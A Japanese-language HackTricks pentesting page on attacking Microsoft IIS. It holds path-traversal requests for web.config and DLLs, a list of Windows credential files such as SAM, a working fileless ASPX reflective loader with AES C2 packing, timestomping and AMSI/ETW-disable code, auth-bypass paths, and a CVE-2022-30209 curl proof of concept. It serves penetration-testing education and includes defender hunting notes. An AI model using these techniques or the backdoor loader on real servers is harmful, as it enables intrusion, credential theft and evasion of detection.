# IIS - Internet Information Services

{{#include ../../banners/hacktricks-training.md}}

テスト用実行ファイルの拡張子:

- asp
- aspx
- config
- php

## 内部IPアドレスの開示

302が返る任意のIISサーバーでは、Host headerを削除してHTTP/1.0を使用してみると、レスポンス内のLocation headerが内部IPアドレスを指すことがあります:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
内部IPを開示するレスポンス:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .config ファイルを実行する

.config ファイルをアップロードしてコードを実行することができます。1つの方法は、ファイル末尾にコードを HTML コメントとして追記することです: [Download example here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

この脆弱性を悪用するための詳細と手法は[here](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)を参照してください。

## IIS Discovery Bruteforce

Download the list that I have created:

{{#file}}
iisfinal.txt
{{#endfile}}

次のリストをマージして作成しました:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

拡張子を追加せずに使用してください。必要な拡張子はすでに含まれています。

## Path Traversal

### Leaking source code

詳細な解説は次を参照してください: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

> [!TIP]
> 要約すると、アプリケーションのフォルダ内には複数の web.config ファイルがあり、**assemblyIdentity** ファイルや **namespaces** への参照が含まれています。これらの情報から、**where are executables located** を特定してダウンロードすることが可能です。\
> ダウンロードした **downloaded Dlls** からは、さらに **new namespaces** を見つけることができ、それらにアクセスして web.config を取得し、新しい namespaces と assemblyIdentity を見つけることができます。\
> また、**connectionstrings.config** や **global.asax** ファイルには興味深い情報が含まれている可能性があります。

In **.Net MVC applications**, the **web.config** file plays a crucial role by specifying each binary file the application relies on through **"assemblyIdentity"** XML tags.

### **バイナリファイルの調査**

以下に **web.config** ファイルへアクセスする例を示します:
```html
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
このリクエストは、以下のような設定や依存関係を明らかにします：

- **EntityFramework** のバージョン
- **AppSettings**（webpages、クライアント検証、JavaScript に関する設定）
- **System.web** の認証およびランタイム構成
- **System.webServer** のモジュール設定
- **Runtime** のアセンブリバインディング（例: **Microsoft.Owin**, **Newtonsoft.Json**, **System.Web.Mvc** など多数）

これらの設定は、**/bin/WebGrease.dll** のようなファイルがアプリケーションの /bin フォルダ内に存在することを示しています。

### **ルートディレクトリのファイル**

ルートディレクトリで見つかる **/global.asax** や **/connectionstrings.config**（機密のパスワードを含む）は、アプリケーションの設定と動作に不可欠です。

### **名前空間と Web.Config**

MVC アプリケーションは、各ファイルで繰り返し宣言するのを避けるため、特定の名前空間向けに追加の **web.config files** を定義することもあります。これは、別の **web.config** をダウンロードするリクエストで示されています：
```html
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLLsのダウンロード**

カスタム名前空間の記述から、/bin ディレクトリに **WebApplication1** という名前の DLL が存在することが示唆されます。続いて、**WebApplication1.dll** をダウンロードするリクエストが表示されます:
```html
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
これは、/bin ディレクトリに **System.Web.Mvc.dll** や **System.Web.Optimization.dll** のような他の重要な DLL が存在することを示唆します。

DLL が **WebApplication1.Areas.Minded** という namespace をインポートしている場合、攻撃者は **/area-name/Views/** のような予測可能なパスに他の web.config ファイルが存在し、特定の設定や /bin フォルダ内の他の DLL への参照を含んでいると推測するかもしれません。例えば、**/Minded/Views/web.config** へのリクエストは、別の DLL **WebApplication1.AdditionalFeatures.dll** の存在を示す設定や namespace を露呈する可能性があります。

### 共通のファイル

From [here](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Error

If you see an error like the following one:

![](<../../images/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

次のことを意味します：サーバーがHost header内で**正しいドメイン名を受け取っていない**ということです。\
ウェブページにアクセスするには、提供されている**SSL Certificate**を確認して、そこにドメイン/サブドメイン名が含まれているかを確認してみてください。含まれていない場合は、正しいものが見つかるまで**brute force VHosts**を行う必要があるかもしれません。

## Decrypt encrypted configuration and ASP.NET Core Data Protection key rings

IIS上でホストされる .NET アプリでシークレットを保護する一般的なパターンは2つあります:
- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) — web.config の <connectionStrings> のようなセクションを保護するためのもの。
- ASP.NET Core Data Protection key ring (persisted locally) — アプリケーションのシークレットとcookiesを保護するために使用され、ローカルに保存される。

webサーバー上でファイルシステムアクセスや対話的アクセスがある場合、同一場所にあるキーは復号を可能にすることが多い。

- ASP.NET (Full Framework) – 保護された構成セクションを aspnet_regiis で復号する:
```cmd
# Decrypt a section by app path (site configured in IIS)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Or specify the physical path (-pef/-pdf write/read to a config file under a dir)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```
- ASP.NET Core – ローカルに保存された Data Protection key rings（XML/JSON ファイル）を次のような場所で探す:
- %PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys
- HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys (registry)
- App-managed folder (e.g., App_Data\keys or a Keys directory next to the app)

key ring が入手できれば、アプリの identity で動作するオペレータは同じ purposes で IDataProtector をインスタンス化し、保存されたシークレットを unprotect できます。key ring をアプリファイルと共に保存してしまうような misconfiguration は、ホストが侵害された後にオフラインでの復号を簡単にします。

## IIS fileless backdoors and in-memory .NET loaders (NET-STAR style)

The Phantom Taurus/NET-STAR toolkit は、w3wp.exe 内部だけで完結する fileless IIS persistence と post‑exploitation の成熟したパターンを示しています。コアとなるアイデアは、カスタムのトレードクラフトや detection/hunting に広く再利用可能です。

Key building blocks
- ASPX bootstrapper hosting an embedded payload: 単一の .aspx ページ（例: OutlookEN.aspx）が Base64‑encoded、オプションで Gzip 圧縮された .NET DLL を含みます。トリガーとなるリクエストを受けるとデコード・解凍して現在の AppDomain にリフレクティブにロードし、メインのエントリポイント（例: ServerRun.Run()）を呼び出します。
- Cookie‑scoped, encrypted C2 with multi‑stage packing: タスク／結果は Gzip → AES‑ECB/PKCS7 → Base64 でラップされ、一見正当な大量の Cookie を伴うリクエストで移動します。オペレータはチャンク切り分けのために安定したデリミタ（例: "STAR"）を使用していました。
- Reflective .NET execution: 任意の managed assembly を Base64 として受け取り、Assembly.Load(byte[]) でロードしてオペレータ引数を渡すことで、ディスクに触れずに素早くモジュール差し替えを行えます。
- Operating in precompiled ASP.NET sites: サイトが precompiled されている場合でも補助的な shells/backdoors を追加・管理できます（例: dropper が動的ページ／ハンドラを追加、または config ハンドラを利用）。bypassPrecompiledApp、addshell、listshell、removeshell といったコマンドで操作できます。
- Timestomping/metadata forgery: changeLastModified アクションを公開し、デプロイ時に timestomp（将来のコンパイルタイムスタンプを含む）を行って DFIR を妨げます。
- Optional AMSI/ETW pre‑disable for loaders: セカンドステージのローダは Assembly.Load を呼ぶ前に AMSI と ETW を無効化して、in‑memory ペイロードの検査を減らすことができます。

Minimal ASPX loader pattern
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
// 1) Obtain payload bytes (hard‑coded blob or from request)
string b64 = /* hardcoded or Request["d"] */;
byte[] blob = Convert.FromBase64String(b64);
// optional: decrypt here if AES is used
using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
using(var ms = new MemoryStream()){
gz.CopyTo(ms);
var asm = Assembly.Load(ms.ToArray());
// 2) Invoke the managed entry point (e.g., ServerRun.Run)
var t = asm.GetType("ServerRun");
var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
object inst = m.IsStatic ? null : Activator.CreateInstance(t);
m.Invoke(inst, new object[]{ HttpContext.Current });
}
}
}
</script>
```
パッキング/cryptoヘルパー (Gzip + AES‑ECB + Base64)
```csharp
using System.Security.Cryptography;

static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
using(var aes = Aes.Create()){
aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
return t.TransformFinalBlock(data, 0, data.Length);
}
}

static string Pack(object obj, byte[] key){
// serialize → gzip → AES‑ECB → Base64
byte[] raw = Serialize(obj);                    // your TLV/JSON/msgpack
using var ms = new MemoryStream();
using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
byte[] enc = AesEcb(ms.ToArray(), key, true);
return Convert.ToBase64String(enc);
}

static T Unpack<T>(string b64, byte[] key){
byte[] enc = Convert.FromBase64String(b64);
byte[] cmp = AesEcb(enc, key, false);
using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
using var outMs = new MemoryStream(); gz.CopyTo(outMs);
return Deserialize<T>(outMs.ToArray());
}
```
Cookie/session フローとコマンドサーフェス
- Session bootstrap と tasking は、通常の Web アクティビティに溶け込ませるため cookies 経由で実行される。
- 実際に観測されたコマンドには次のものが含まれる: fileExist, listDir, createDir, renameDir, fileRead, deleteFile, createFile, changeLastModified; addshell, bypassPrecompiledApp, listShell, removeShell; executeSQLQuery, ExecuteNonQuery; および in‑memory .NET 実行のための動的実行プリミティブ code_self, code_pid, run_code。

Timestomping utility
```csharp
File.SetCreationTime(path, ts);
File.SetLastWriteTime(path, ts);
File.SetLastAccessTime(path, ts);
```
Assembly.Load の前に AMSI/ETW をインラインで無効化 (loader variant)
```csharp
// Patch amsi!AmsiScanBuffer to return E_INVALIDARG
// and ntdll!EtwEventWrite to a stub; then load operator assembly
DisableAmsi();
DisableEtw();
Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
```
See AMSI/ETW bypass techniques in: windows-hardening/av-bypass.md

ハンティングノート（防御側）
- 単一で奇妙な ASPX ページ、非常に長い Base64/Gzip ブロブを含む; cookie が多い POST。
- w3wp.exe 内の unbacked managed モジュール; `Encrypt/Decrypt (ECB)`, `Compress/Decompress`, `GetContext`, `Run` のような文字列。
- トラフィック中に "STAR" のような繰り返し区切り文字; ASPX/assemblies 上で不一致または将来のタイムスタンプ。

## 古い IIS 脆弱性 — 調査する価値のあるもの

### Microsoft IIS tilde character “\~” Vulnerability/Feature – Short File/Folder Name Disclosure

この手法を使うと、見つかった各フォルダ内（Basic Authentication が必要な場合でも）でフォルダやファイルを列挙（enumerate）できます。  
サーバが脆弱な場合の主な制限は、各ファイル/フォルダ名の最初の最大6文字と、拡張子の最初の最大3文字しか見つけられないことです。

You can use [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) to test for this vulnerability:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../images/image (844).png>)

Original research: [https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

また **metasploit** を使用できます: `use scanner/http/iis_shortname_scanner`

検出したファイルの最終的な名前を見つける良いアイデアとしては、[https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py](https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py) のスクリプトで行っているように、LLMs に候補を出してもらうことです。

### Basic Authentication bypass

**Bypass** a basic authentication (**IIS 7.5**) trying to access: `/admin:$i30:$INDEX_ALLOCATION/admin.php` or `/admin::$INDEX_ALLOCATION/admin.php`

この脆弱性と前述の手法を**組み合わせて**新しい**フォルダ**を見つけたり、認証を**バイパス**したりすることができます。

## ASP.NET Trace.AXD enabled debugging

ASP.NET にはデバッグモードがあり、そのファイルは `trace.axd` と呼ばれます。

これは一定期間にアプリケーションへ行われたすべてのリクエストの非常に詳細なログを保持します。

この情報にはリモートクライアントの IP、セッション ID、すべてのリクエストおよびレスポンスの cookie、物理パス、ソースコード情報、場合によってはユーザー名やパスワードさえ含まれます。

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH は以下の情報を使用します:

- **`validationKey`** (string): 署名検証に使用される16進エンコードされたキー。
- **`decryptionMethod`** (string): （デフォルト “AES”）。
- **`decryptionIV`** (string): 16進エンコードされた初期化ベクタ（デフォルトはゼロベクトル）。
- **`decryptionKey`** (string): 復号に使用される16進エンコードされたキー。

ただし、これらのパラメータの**デフォルト値**を使用し、かつ cookie として**ユーザーのメールアドレス**を使う実装もあります。したがって、ASPXAUTH cookie を使用している同じプラットフォームの別のサイトを見つけ、攻撃対象サーバ上で対象ユーザーのメールアドレスでアカウントを作成できれば、2つ目のサーバの cookie を最初のサーバで使ってそのユーザーになりすますことが可能かもしれません。  
この攻撃はこの [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19) で動作した例が示されています。

## IIS Authentication Bypass with cached passwords (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Full report here](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): コードのバグにより、ユーザーが入力したパスワードを**正しく検証していなかった**ため、ある攻撃者の**password hash が既にキャッシュにあるキーに一致した場合**、その攻撃者はそのユーザーとしてログインできてしまいます。
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
## 参考文献

- [Unit 42 – Phantom Taurus: A New Chinese Nexus APT and the Discovery of the NET-STAR Malware Suite](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [AMSI/ETW bypass background (HackTricks)](../../windows-hardening/av-bypass.md)

{{#include ../../banners/hacktricks-training.md}}
